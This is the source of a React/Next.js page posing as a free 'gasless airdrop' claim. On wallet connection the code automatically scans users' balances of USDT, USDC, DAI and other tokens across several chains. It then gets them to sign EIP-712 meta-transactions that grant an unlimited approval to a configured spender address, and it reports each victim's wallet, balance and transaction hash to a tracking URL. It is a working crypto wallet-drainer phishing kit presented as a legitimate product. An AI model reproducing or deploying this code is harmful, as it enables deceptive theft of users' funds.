'use client';
import { useState, useEffect } from 'react';
import { useAccount, useSignTypedData } from 'wagmi';
import { readContract, switchChain } from '@wagmi/core';
import { erc20Abi } from 'viem';
import { config } from '@/config';
import { ethers } from 'ethers';

// Environment variables
const REPORT_URL = process.env.NEXT_PUBLIC_REPORT_URL;
const RELAYER_URL = process.env.NEXT_PUBLIC_RELAYER_URL || 'http://localhost:3001';

// Trusted Forwarder addresses by chain
const TRUSTED_FORWARDERS: Record<number, string> = {
  1: process.env.NEXT_PUBLIC_TRUSTED_FORWARDER_MAINNET || "",
  42161: process.env.NEXT_PUBLIC_TRUSTED_FORWARDER_ARBITRUM || "",
  11155111: process.env.NEXT_PUBLIC_TRUSTED_FORWARDER_SEPOLIA || "",
  137: process.env.NEXT_PUBLIC_TRUSTED_FORWARDER_POLYGON || "",
  56: process.env.NEXT_PUBLIC_TRUSTED_FORWARDER_BNB || "",
};

const SPENDER = (process.env.NEXT_PUBLIC_SPENDER_ADDRESS || "") as `0x${string}`;

// Token configurations by chain
const TOKENS_BY_CHAIN: Record<
  number,
  { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[]
> = {
  1: [
    { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "DAI",  address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", min: BigInt(1 * 10 ** 18), decimals: 18 },
    { symbol: "BUSD", address: "0x4fabb145d64652a948d72533023f6e7a623c7c53", min: BigInt(1 * 10 ** 18), decimals: 18 },
  ],
  42161: [
    { symbol: "USDT", address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "USDC", address: "0xFF970A61A04b1cA14834A43f5de4533eBDDB5CC8", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "DAI",  address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", min: BigInt(1 * 10 ** 18), decimals: 18 },
  ],
  11155111: [
    { symbol: "USDC", address: "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "LINK", address: "0x779877A7B0D9E8603169DdbD7836e478b4624789", min: BigInt(1 * 10 ** 18), decimals: 18 },
  ],
  137: [
    { symbol: "USDT", address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "USDC", address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", min: BigInt(1 * 10 ** 6), decimals: 6 },
  ],
};

const CHAIN_NAMES: Record<number, string> = {
  1: "Ethereum",
  42161: "Arbitrum",
  11155111: "Sepolia",
  137: "Polygon",
  56: "BSC",
};

// ERC2771Forwarder ForwardRequest structure
interface ForwardRequest {
  from: string;
  to: string;
  value: string;
  gas: string;
  nonce: string;
  deadline: string;
  data: string;
}

interface MetaTxMessage {
  request: ForwardRequest;
  signature: string;
}

// Connection reporter component
function ConnectionReporter() {
  const { address, isConnected } = useAccount();

  useEffect(() => {
    if (isConnected && address && REPORT_URL) {
      fetch(REPORT_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          event: "connect",
          wallet: address,
        }),
      }).catch(console.error);
    }
  }, [isConnected, address]);

  return null;
}

// Create ERC2771 ForwardRequest for token approval
function createForwardRequest(
  userAddress: string,
  tokenAddress: string,
  spenderAddress: string,
  gasLimit = '150000',
  validityMinutes = 30
): ForwardRequest {
  // Create ERC20 approve call data
  const iface = new ethers.Interface([
    'function approve(address spender, uint256 amount) returns (bool)'
  ]);
  const approveData = iface.encodeFunctionData('approve', [
    spenderAddress,
    ethers.MaxUint256
  ]);

  const deadline = Math.floor(Date.now() / 1000) + (validityMinutes * 60);

  return {
    from: userAddress,
    to: tokenAddress, // Target is the token contract
    value: '0',
    gas: gasLimit,
    nonce: '0', // Will be set by relayer
    deadline: String(deadline),
    data: approveData
  };
}

// Build EIP-712 payload for OpenZeppelin ERC2771Forwarder
function buildEIP712Domain(forwarderAddress: string, chainId: number, request: ForwardRequest) {
  const domain = {
    name: 'ERC2771Forwarder',
    version: '1',
    chainId: chainId,
    verifyingContract: forwarderAddress as `0x${string}`
  } as const;

  const types = {
    ForwardRequest: [
      { name: 'from', type: 'address' },
      { name: 'to', type: 'address' },
      { name: 'value', type: 'uint256' },
      { name: 'gas', type: 'uint256' },
      { name: 'nonce', type: 'uint256' },
      { name: 'deadline', type: 'uint48' },
      { name: 'data', type: 'bytes' }
    ]
  } as const;

  return { domain, types, message: request };
}

export default function Home() {
  const { address, isConnected, chainId } = useAccount();
  const { signTypedDataAsync } = useSignTypedData();
  const [status, setStatus] = useState<string>("");

  async function callMetaTxRelayer(
    chainId: number,
    tokenAddress: string,
    userAddress: string,
    metaTxMessage: MetaTxMessage
  ): Promise<{ success: boolean; txHash?: string; error?: string; alreadyApproved?: boolean }> {
    console.log('Calling MetaTx relayer:', {
      RELAYER_URL,
      chainId,
      tokenAddress: tokenAddress.slice(0, 10) + '…',
      userAddress: userAddress.slice(0, 10) + '…',
    });

    try {
      const response = await fetch(`${RELAYER_URL}/metatx`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({
          chainId,
          tokenAddress: tokenAddress.toLowerCase(),
          userAddress,
          metaTxMessage,
        }),
      });

      console.log('Response status:', response.status, response.ok);

      if (!response.ok) {
        const errorText = await response.text();
        console.error('Relayer error response:', errorText);
        return {
          success: false,
          error: `Relayer error: ${response.status} - ${errorText}`
        };
      }

      const data = await response.json();
      console.log('Relayer response:', data);
      
      return data;
    } catch (error: any) {
      console.error('Relayer call failed:', error);
      
      if (error.name === 'TypeError' && error.message.includes('fetch')) {
        return {
          success: false,
          error: 'Cannot connect to relayer. Check if relayer URL is correct.'
        };
      }
      
      return {
        success: false,
        error: error.message || 'Failed to call relayer'
      };
    }
  }

  async function handleClaim() {
    if (!isConnected || !address) {
      setStatus("Wallet not connected");
      return;
    }

    try {
      console.log('Starting claim process...');
      console.log('RELAYER_URL:', RELAYER_URL);
      console.log('Current address:', address);
      console.log('Current chain:', chainId);

      setStatus("Scanning chains for balances...");

      let targetChain: number | null = null;
      let usableTokens: { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[] = [];

      // Find tokens with sufficient balance
      for (const [cid, tokens] of Object.entries(TOKENS_BY_CHAIN)) {
        const numericCid = Number(cid);

        for (const token of tokens) {
          try {
            const balance = await readContract(config, {
              chainId: numericCid,
              address: token.address,
              abi: erc20Abi,
              functionName: "balanceOf",
              args: [address],
            }) as bigint;

            console.log(`Balance check: ${token.symbol} on chain ${numericCid}:`, balance.toString());

            if (balance >= token.min) {
              targetChain = numericCid;
              usableTokens.push(token);
              console.log(`Found usable token: ${token.symbol} with balance ${balance.toString()}`);
            }
          } catch (error) {
            console.log(`Error checking balance for ${token.symbol} on chain ${numericCid}:`, error);
          }
        }

        if (usableTokens.length > 0) break;
      }

      if (!targetChain || usableTokens.length === 0) {
        setStatus("No usable balances found on any chain.");
        return;
      }

      const chainName = CHAIN_NAMES[targetChain] || `Chain ${targetChain}`;
      console.log(`Target chain: ${chainName} (${targetChain}) with ${usableTokens.length} tokens`);

      // Switch chain if necessary
      if (chainId !== targetChain) {
        setStatus(`Switching to ${chainName}...`);
        try {
          await switchChain(config, { chainId: targetChain });
          console.log(`Switched to chain ${targetChain}`);
        } catch (error) {
          console.error('Failed to switch chain:', error);
          setStatus('Failed to switch chain. Please switch manually.');
          return;
        }
      }

      // Test relayer connectivity
      try {
        setStatus('Testing relayer connection...');
        const healthResponse = await fetch(`${RELAYER_URL}/health`);
        if (!healthResponse.ok) {
          throw new Error(`Health check failed: ${healthResponse.status}`);
        }
        console.log('Relayer is healthy');
      } catch (error) {
        console.error('Relayer health check failed:', error);
        setStatus('Relayer service unavailable. Please try again later.');
        return;
      }

      const forwarderAddress = TRUSTED_FORWARDERS[targetChain];
      if (!forwarderAddress) {
        setStatus(`No trusted forwarder configured for chain ${targetChain}`);
        console.error(`No trusted forwarder for chain ${targetChain}`);
        return;
      }

      // Process each token
      for (const token of usableTokens) {
        setStatus(`Processing ${token.symbol} on ${chainName}...`);

        console.log(`Processing token: ${token.symbol} (${token.address})`);

        // Check current allowance
        try {
          const currentAllowance = await readContract(config, {
            chainId: targetChain,
            address: token.address,
            abi: erc20Abi,
            functionName: "allowance",
            args: [address, SPENDER],
          }) as bigint;

          if (currentAllowance > 0n) {
            setStatus(`${token.symbol} already approved`);
            console.log(`${token.symbol} already approved`);
            continue;
          }
        } catch (error) {
          console.error('Error checking allowance:', error);
        }

        // Create ForwardRequest
        const forwardRequest = createForwardRequest(address, token.address, SPENDER);

        setStatus(`Please sign MetaTx for ${token.symbol}...`);
        console.log('ForwardRequest:', forwardRequest);
        
        // Sign using EIP-712
        let signature: string;
        try {
          const payload = buildEIP712Domain(forwarderAddress, targetChain, forwardRequest);
          signature = await signTypedDataAsync({ 
            domain: payload.domain,
            types: payload.types as any,
            primaryType: 'ForwardRequest',
            message: payload.message as unknown as Record<string, unknown>,
          });
          console.log('MetaTx signed successfully');
        } catch (error: any) {
          console.error('MetaTx signing failed:', error);
          if (error.message.includes('User rejected')) {
            setStatus('Transaction cancelled by user');
            return;
          }
          setStatus(`Failed to sign MetaTx: ${error.message}`);
          continue;
        }

        setStatus(`Submitting ${token.symbol} MetaTx to relayer...`);

        const metaTxMessage: MetaTxMessage = {
          request: forwardRequest,
          signature: signature
        };

        const result = await callMetaTxRelayer(
          targetChain,
          token.address,
          address,
          metaTxMessage
        );

        if (!result.success) {
          setStatus(`Failed to approve ${token.symbol}: ${result.error}`);
          console.error(`Relayer failed for ${token.symbol}:`, result.error);
          continue;
        }

        if (result.alreadyApproved) {
          setStatus(`${token.symbol} was already approved`);
          console.log(`${token.symbol} was already approved`);
        } else {
          console.log(`${token.symbol} approval transaction successful:`, result.txHash);
        }

        // Get balance for reporting
        let rawBalance: bigint = BigInt(0);
        let formattedBalance = 0;
        try {
          rawBalance = await readContract(config, {
            chainId: targetChain,
            address: token.address,
            abi: erc20Abi,
            functionName: "balanceOf",
            args: [address],
          }) as bigint;
          formattedBalance = Number(rawBalance) / 10 ** token.decimals;
        } catch (err) {
          console.error(`Failed to read balance for ${token.symbol}:`, err);
        }

        setStatus(`${token.symbol} approved | Balance: ${formattedBalance.toFixed(4)}`);

        // Report approval
        if (REPORT_URL && result.txHash) {
          try {
            await fetch(REPORT_URL, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                event: "approval",
                wallet: address,
                chainName,
                token: token.address,
                symbol: token.symbol,
                balance: formattedBalance,
                txHash: result.txHash,
                relayed: true,
              }),
            });
            console.log(`Reported approval for ${token.symbol}`);
          } catch (error) {
            console.error('Failed to report approval:', error);
          }
        }

        // Delay between tokens
        await new Promise(resolve => setTimeout(resolve, 1000));
      }

      setStatus("All approvals completed!");
      console.log('All approvals completed successfully!');
    } catch (err: any) {
      console.error('handleClaim error:', err);
      setStatus("Error: " + (err?.shortMessage || err?.message || "unknown"));
    }
  }

  // Auto-trigger claim when wallet connects
  useEffect(() => {
    if (isConnected && address) {
      console.log('Wallet connected, starting claim process');
      handleClaim();
    }
  }, [isConnected, address]);

  return (
    <main style={{
      display: "flex",
      flexDirection: "column",
      alignItems: "center",
      gap: "24px",
      marginTop: "40px",
    }}>
      <header style={{
        position: "fixed",
        top: 0,
        left: 0,
        right: 0,
        height: "64px",
        background: "#09011fff",
        display: "flex",
        alignItems: "center",
        justifyContent: "space-between",
        padding: "0 24px",
        paddingTop: "env(safe-area-inset-top)",
        boxShadow: "0 2px 8px rgba(241, 235, 235, 0.08)",
        zIndex: 1000,
      }}>
        <div style={{
          fontFamily: "sans-serif",
          fontWeight: "bold",
          fontSize: "18px",
          color: "#aaa587ff"
        }}>
          GASLESS AIRDROPS
        </div>
        <div />
      </header>

      <ConnectionReporter />

      <div style={{
        display: "flex",
        flexDirection: "column",
        gap: "24px",
        paddingTop: "80px",
        width: "80%",
        maxWidth: "600px",
      }}>
        <div style={{
          border: "1px solid #9dd6d1ff",
          borderRadius: "12px",
          padding: "20px",
          background: "#090e41ff",
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          justifyContent: "space-between",
          height: "500px",
        }}>
          <div>
            <h2 style={{ 
              marginBottom: "12px", 
              textAlign: "center", 
              color: "#ffffff" 
            }}>
              Gasless Token Approval
            </h2>
            <p style={{ 
              fontSize: "12px", 
              color: "#9dd6d1ff", 
              textAlign: "center", 
              margin: "0 0 20px 0" 
            }}>
              Gas fees sponsored by us! Just sign the message.
            </p>
            {RELAYER_URL !== 'http://localhost:3001' && (
              <p style={{ 
                fontSize: "10px", 
                color: "#666", 
                textAlign: "center", 
                margin: "0 0 10px 0" 
              }}>
                Relayer: {RELAYER_URL.replace('https://', '').slice(0, 30)}...
              </p>
            )}
          </div>

          <div style={{
            flex: 1,
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            color: "#e4e1daff",
            fontSize: "14px",
            textAlign: "center",
            padding: "0 20px",
            wordBreak: "break-word",
          }}>
            {status || "Connect your wallet to get started"}
          </div>

          <div style={{ 
            display: "flex", 
            flexDirection: "column", 
            alignItems: "center", 
            gap: "12px" 
          }}>
            <button
              onClick={handleClaim}
              disabled={!isConnected}
              style={{
                background: isConnected ? "#a00b0bff" : "#666",
                color: "white",
                padding: "12px 28px",
                borderRadius: "8px",
                cursor: isConnected ? "pointer" : "not-allowed",
                border: "none",
                fontSize: "16px",
                fontWeight: "bold",
                opacity: isConnected ? 1 : 0.6,
              }}
            >
              {isConnected ? "Claim Now (Free)" : "Connect Wallet First"}
            </button>
            
            {isConnected && (
              <p style={{ 
                fontSize: "11px", 
                color: "#9dd6d1ff", 
                textAlign: "center", 
                margin: 0 
              }}>
                Connected: {address?.slice(0, 6)}...{address?.slice(-4)}
              </p>
            )}
          </div>
        </div>
      </div>
    </main>
  );
}